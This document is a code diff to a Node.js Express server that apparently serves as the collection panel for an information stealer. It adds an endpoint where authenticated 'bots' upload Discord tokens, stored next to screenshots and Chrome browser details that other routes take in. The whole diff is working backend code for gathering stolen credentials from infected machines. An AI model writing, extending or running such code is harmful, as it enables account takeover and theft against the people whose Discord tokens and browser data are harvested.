@@ -126,7 +126,7 @@ module.exports = (application) => {
                         } else {
                             db.Screenshots.create({
                                 identifier: identifier,
-                                link: identifier + ".jpg",
+                                link: "./server/images/" + identifier + ".jpg",
                             }).then(() => {
                                 res.status(200).json({
                                     message: "Upload OK",
@@ -188,6 +188,56 @@ module.exports = (application) => {
                         }).then(() => {
                             res.status(200).json({
                                 message: "Chrome details created",
+                            });
+                        });
+                    }
+                });
+            } else {
+                res.status(401).json({
+                    message: "Bot not found or token/id is invalid",
+                });
+            }
+        } else {
+            res.status(403).json({
+                message: "Missing token/id or not enough POST fields",
+            });
+        }
+    });
+
+    application.post("/update/discord/:identifier/:token", async (req, res) => {
+        const { identifier, token } = req.params;
+        const { tokens } = req.body;
+        if (identifier && token && token) {
+            const verify = await v.validate(identifier, token);
+            if (verify) {
+                db.Discord.findAll({
+                    where: {
+                        identifier: identifier,
+                    },
+                }).then((results) => {
+                    if (results.length > 0) {
+                        db.Discord.update(
+                            {
+                                identifier: identifier,
+                                tokens: tokens,
+                            },
+                            {
+                                where: {
+                                    identifier: identifier,
+                                },
+                            }
+                        ).then(() => {
+                            res.status(200).json({
+                                message: "Discord details updated",
+                            });
+                        });
+                    } else {
+                        db.Discord.create({
+                            identifier: identifier,
+                            tokens: tokens,
+                        }).then(() => {
+                            res.status(200).json({
+                                message: "Discord details updated",
                             });
                         });
                     }
